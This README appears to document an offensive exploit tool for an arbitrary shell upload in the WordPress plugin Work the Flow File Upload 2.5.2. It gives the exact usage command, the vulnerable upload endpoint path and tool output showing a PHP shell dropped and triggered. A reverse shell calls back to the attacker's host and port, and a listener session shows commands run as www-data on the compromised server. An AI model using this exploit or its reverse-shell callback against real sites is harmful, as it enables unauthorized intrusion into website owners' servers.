# Exploit for Wordpress Work the flow file upload 2.5.2 Shell Upload
This plugin comes with added backdoor upload features, so naturally, I had to quickly knock together an exploit for it. Basically another trivial shell upload, trying to burn through a few of these so I have non-MSF exploits for when needed.

## Usage

To use, simply select which payload you want to use (currently only back_python.php is available, but I plan on adding back_php.php and back_perl.php at a later date). This is the 
"payload.php". You also must specify a callback host and port, along with the URL to the vulnerable Wordpress installation.

Example Use:
```
xrl:~$ python2 pwnflow.py http://192.168.0.15/wordpress/ back_python.php 192.168.0.9 1337

 ██▓███   █     █░███▄    █   █████▒██▓     ▒█████   █     █░
▓██░  ██▒▓█░ █ ░█░██ ▀█   █ ▓██   ▒▓██▒    ▒██▒  ██▒▓█░ █ ░█░
▓██░ ██▓▒▒█░ █ ░█▓██  ▀█ ██▒▒████ ░▒██░    ▒██░  ██▒▒█░ █ ░█ 
▒██▄█▓▒ ▒░█░ █ ░█▓██▒  ▐▌██▒░▓█▒  ░▒██░    ▒██   ██░░█░ █ ░█ 
▒██▒ ░  ░░░██▒██▓▒██░   ▓██░░▒█░   ░██████▒░ ████▓▒░░░██▒██▓ 
▒▓▒░ ░  ░░ ▓░▒ ▒ ░ ▒░   ▒ ▒  ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▓░▒ ▒  
░▒ ░       ▒ ░ ░ ░ ░░   ░ ▒░ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ▒ ░ ░  
░░         ░   ░    ░   ░ ░  ░ ░     ░ ░   ░ ░ ░ ▒    ░   ░  
             ░            ░            ░  ░    ░ ░      ░    
Exploit for Work The Flow w/ Shell Upload. Version: 20150427.1
{+} Using target URL of: http://192.168.0.15/wordpress//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php
{+} Our shell is at: http://192.168.0.15/wordpress//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/pwn%20%281%29.php
{*} Sending Backconnect to 192.168.0.9:1337...
{*} Sending our payload...
{+} Using 192.168.0.9:1337 as callback...
{+} Dropping shell...
{+} Shell dropped... Triggering...
{+} got shell?
xrl:~$
```

Listener (I suggest using the [tcp-pty-shell-handler][shellhandle]):
```
xrl:~$ python2 /tmp/testing/python-pty-shells/tcp_pty_shell_handler.py -b 0.0.0.0:1337
Got root yet?
Linux htp 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 (2015-03-02) x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</assets/jQuery-File-Upload-9.5.0/server/php/files$ ls
pwn (1).php  pwn.php
</assets/jQuery-File-Upload-9.5.0/server/php/files$ rm *.php
</assets/jQuery-File-Upload-9.5.0/server/php/files$ w
 21:14:42 up  1:25,  3 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty7     :0               19:49    1:25m 15.13s  0.04s gdm-session-wor
root     pts/0    :0.0             19:49    1:00m  6.87s  0.48s bash
root     pts/1    192.168.0.9      20:14    2:10   0.54s  0.54s -bash
</assets/jQuery-File-Upload-9.5.0/server/php/files$ exit
exit
quitting, cleanup
xrl:~$
```

## ASCIICAST
If you want, check out the [Asciicast demo][asciicast]. The ASCII art got a bit fucked this time around due to term resizing.
[![asciicast](https://asciinema.org/a/19276.png)](https://asciinema.org/a/19276)

## Licence
Licenced under the [WTFPL][wtfpl]

[asciicast]: https://asciinema.org/a/19276
[wtfpl]: http://www.wtfpl.net/
[shellhandle]: https://github.com/infodox/python-pty-shells
